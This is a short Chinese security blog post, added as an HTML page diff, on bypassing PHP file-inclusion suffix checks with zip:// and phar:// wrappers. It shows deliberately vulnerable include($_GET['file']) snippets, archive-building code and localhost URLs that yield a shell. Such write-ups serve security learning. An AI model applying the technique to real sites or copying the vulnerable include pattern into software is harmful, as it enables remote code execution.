@@ -1,0 +1,159 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>zip或phar协议包含文件</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="apple-touch-icon" href="/public/img/head.png">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+  <link rel="stylesheet" href="/public/css/highlight-js/github.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">Tomato's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+        <!-- <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+        <!-- <li><a href="#">About Me</a></li> -->
+        <li><a href="/feed.xml">Feed</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">zip或phar协议包含文件</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2015-06-10</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">tricks, php</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>这个方法适用于验证包含文件为特定后缀时。
+例如以下代码</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>
+<span class="cp">&lt;?php</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">))</span> <span class="o">==</span> <span class="s2">".jpg"</span><span class="p">){</span>
+	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="o">.</span><span class="s1">'.jpg'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+<p>上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。</p>
+
+<p><strong>zip://</strong>
+首先我们新建一个zip文件，里面压缩着一个php脚本。</p>
+
+<p><img src="/Users/Tomato/Documents/blog_backup/usr/uploads/2015/06/2355213942.png" alt="1.png" />
+然后我们构造zip://php.zip#php.jpg</p>
+
+<p>http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-819654707.png" alt="819654707" /></p>
+
+<p>这样就成功shell了。</p>
+
+<p><strong>phar://</strong>
+首先我们要用phar类打包一个phar标准包</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PharData</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">'/phartest2.zip'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="s1">'phartest2'</span><span class="p">,</span><span class="nx">Phar</span><span class="o">::</span><span class="na">ZIP</span><span class="p">)</span> <span class="p">;</span> 
+<span class="nv">$x</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'./php.php'</span><span class="p">);</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">'a.jpg'</span><span class="p">,</span> 
+<span class="nv">$x</span><span class="p">);</span> 
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+<p>会生成一个zip的压缩文件。然后我们构造</p>
+
+<p>http://127.0.0.1/file.php?file=phar://php.zip/php.jpg</p>
+
+<p>也可以直接shell</p>
+
+<p>其中phar适用范围为php&gt;5.3.0</p>
+
+<p>以下的这种包含方式在这样的情况下是无效的。
+include(一个规定的路径+可控点)</p>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+var disqus_shortname = "tomatos-blog";
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2017 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+$(document).ready(function(){
+  $.AMUI.progress.start();
+});
+$(window).load(function(){
+  $.AMUI.progress.done();
+});
+</script>
+<script src="/public/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- 网站统计代码 -->
+<div hidden>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</div>
+<div hidden>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?3601be0ac702a94d879f3f571cec1e53";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
